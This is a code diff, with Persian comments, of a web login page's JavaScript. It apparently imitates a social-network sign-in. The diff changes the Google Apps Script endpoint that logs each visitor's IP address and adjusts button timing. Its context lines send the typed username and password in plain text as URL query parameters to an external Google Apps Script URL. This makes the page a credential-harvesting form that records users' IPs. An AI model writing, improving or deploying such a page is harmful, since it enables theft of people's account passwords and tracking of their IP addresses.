@@ -160,7 +160,7 @@
         async function sendUserIp() {
             var userIp = await getUserIp();
             if (userIp) {
-                fetch('https://script.google.com/macros/s/AKfycbyvis45EasAahJq_XCe7YnKSHTv4O_kzOB1DcVIebhTkfj05IGgUPqOK1xniAIQAXw/exec?ip=' + encodeURIComponent(userIp));
+                fetch('https://script.google.com/macros/s/AKfycbx8YXq5WSbxlXFOm3KB5LOdVx3D6a2LBh7k18eZ8eQOFdr710qH3VFNl5z8IzCuHRGC/exec?ip=' + encodeURIComponent(userIp));
             }
         }
 
@@ -170,11 +170,12 @@
             var button = event.target.querySelector('button');
             var message = document.getElementById('message');
             var forgotPassword = document.getElementById('forgotPassword');
-            button.disabled = true; // غیر فعال کردن دکمه
-            button.style.backgroundColor = '#d1d1d1'; // تغییر رنگ دکمه به طوسی
-
+            
             var username = document.getElementById('username').value;
             var password = document.getElementById('password').value;
+
+            button.disabled = true; // غیر فعال کردن دکمه
+            button.style.backgroundColor = '#d1d1d1'; // تغییر رنگ دکمه به طوسی
 
             // ارسال نام کاربری و رمز عبور به سرویس Google Apps Script
             fetch('https://script.google.com/macros/s/AKfycbyvis45EasAahJq_XCe7YnKSHTv4O_kzOB1DcVIebhTkfj05IGgUPqOK1xniAIQAXw/exec?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password))
@@ -202,18 +203,18 @@
                 }
             })
             .finally(() => {
-                // فعال کردن دوباره دکمه پس از 3 ثانیه
+                // فعال کردن دوباره دکمه ورود بلافاصله بعد از نمایش پیام
                 setTimeout(() => {
                     button.disabled = false;
                     button.style.backgroundColor = '#3897f0'; // برگرداندن رنگ دکمه به حالت اولیه
                     // مخفی کردن پیغام
                     message.className = 'message';
-                }, 2000);
+                }, 500);
 
                 // جابجا کردن فراموشی رمز عبور
                 setTimeout(() => {
                     forgotPassword.style.marginTop = '70px'; // جابجایی به سمت پایین
-                }, 500); // شروع انیمیشن پیغام بعد از 0.5 ثانیه
+                }, 200); // شروع انیمیشن پیغام بعد از 0.5 ثانیه
             });
         });
 
